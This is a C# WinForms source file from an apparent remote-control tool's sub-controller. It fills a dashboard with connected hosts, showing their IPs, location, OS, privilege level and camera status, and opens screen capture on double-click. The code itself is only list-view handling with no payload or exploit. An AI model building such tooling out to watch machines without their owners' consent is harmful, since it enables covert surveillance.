using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using RemoteControl.Protocals;

namespace RemoteControl.SubController
{
    partial class FrmSubMain
    {
        private void InitDashboard()
        {
            hostListView.Columns.Clear();
            hostListView.Columns.Add("主机名", 120);
            hostListView.Columns.Add("用户", 100);
            hostListView.Columns.Add("外网IP", 130);
            hostListView.Columns.Add("内网IP", 120);
            hostListView.Columns.Add("位置", 150);
            hostListView.Columns.Add("系统", 200);
            hostListView.Columns.Add("权限", 70);
            hostListView.Columns.Add("摄像头", 60);
            hostListView.Columns.Add("备注", 120);
            hostListView.Columns.Add("最后活动", 90);

            hostListView.MouseUp += hostListView_MouseUp;
            hostListView.DoubleClick += hostListView_DoubleClick;
        }

        private void RefreshDashboard()
        {
            hostListView.BeginUpdate();
            try
            {
                hostListView.Items.Clear();
                var clients = Relay.GetClientSnapshot();
                foreach (var session in clients)
                {
                    if (!SessionMatchesGroup(session))
                        continue;
                    hostListView.Items.Add(CreateHostItem(session));
                }
            }
            finally
            {
                hostListView.EndUpdate();
            }
            UpdateGroupCounters();
        }

        private void UpsertDashboardClient(SocketSession session)
        {
            if (session == null || string.IsNullOrEmpty(session.SocketId))
                return;

            ListViewItem item = FindItem(session.SocketId);
            if (item == null)
                hostListView.Items.Add(CreateHostItem(session));
            else
                ApplyHostItem(item, session);
        }

        private void RemoveDashboardClient(string socketId)
        {
            ListViewItem item = FindItem(socketId);
            if (item != null)
                hostListView.Items.Remove(item);
            RemoveSessionGroup(socketId);
            UpdateGroupCounters();
        }

        private ListViewItem FindItem(string socketId)
        {
            foreach (ListViewItem item in hostListView.Items)
            {
                var s = item.Tag as SocketSession;
                if (s != null && s.SocketId == socketId)
                    return item;
            }
            return null;
        }

        private ListViewItem CreateHostItem(SocketSession session)
        {
            var item = new ListViewItem();
            ApplyHostItem(item, session);
            return item;
        }

        private void ApplyHostItem(ListViewItem item, SocketSession session)
        {
            string[] values = BuildRowValues(session);
            item.Text = values[0];
            while (item.SubItems.Count < values.Length)
                item.SubItems.Add("");
            for (int i = 1; i < values.Length; i++)
                item.SubItems[i].Text = values[i];
            item.Tag = session;
        }

        private string[] BuildRowValues(SocketSession session)
        {
            if (session == null)
                return new string[] { "未知", "-", "-", "-", "-", "-", "-", "-", "-", "-" };

            return new string[]
            {
                Safe(session.HostName),
                Safe(session.UserName),
                Safe(session.GetExternalIP()),
                Safe(session.LocalIP),
                Safe(session.Location),
                Safe(session.OSVersion),
                Safe(session.Privilege),
                Safe(session.CameraStatus),
                Safe(session.Remark),
                session.LastActiveTime.ToString("HH:mm:ss")
            };
        }

        private static string Safe(string s)
        {
            return string.IsNullOrEmpty(s) ? "-" : s;
        }

        private SocketSession GetSelectedSession()
        {
            if (hostListView.SelectedItems.Count == 0)
                return null;
            return hostListView.SelectedItems[0].Tag as SocketSession;
        }

        private void hostListView_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right && hostListView.SelectedItems.Count > 0)
            {
                _currentSession = GetSelectedSession();
                if (_currentSession != null)
                {
                    Relay.SelectClient(_currentSession.SocketId);
                }
                contextMenuHost.Show(hostListView, e.Location);
            }
        }

        private void hostListView_DoubleClick(object sender, EventArgs e)
        {
            _currentSession = GetSelectedSession();
            if (_currentSession != null)
            {
                Relay.SelectClient(_currentSession.SocketId);
                OpenScreenCapture(3);
            }
        }
    }
}
